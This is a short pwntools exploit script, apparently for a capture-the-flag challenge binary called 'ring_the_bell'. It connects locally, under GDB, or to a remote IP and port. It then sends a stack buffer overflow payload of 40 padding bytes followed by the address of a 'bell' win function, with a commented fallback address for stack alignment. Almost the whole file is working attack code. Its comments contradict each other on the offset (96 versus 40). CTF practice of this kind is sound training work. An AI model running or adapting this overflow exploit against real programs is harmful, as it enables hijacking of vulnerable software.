from pwn import *

# Context setup
exe = ELF('/a2524051-f9be-41f0-ad00-5d4593ff565a-1784741501/ring_the_bell') # Adjust path if needed
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('154.57.164.78', 30110)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *bell
continue
'''.format(**locals())

io = start()

# If 96 'A's fills the buffer and 4 (or 8) more overwrite RBP:
# 64-bit offsets usually require padding up to RBP + 8 bytes to hit RIP.
offset = 40 # Verify in GDB if RBP is 8 bytes wide

win_addr = 0x0040176d # Start of bell()
# win_addr = 0x00401775 # Use this if glibc crashes due to 16-byte stack alignment (movaps)

payload = flat(
    b'A' * offset,
    win_addr
)

io.sendline(payload)
io.interactive()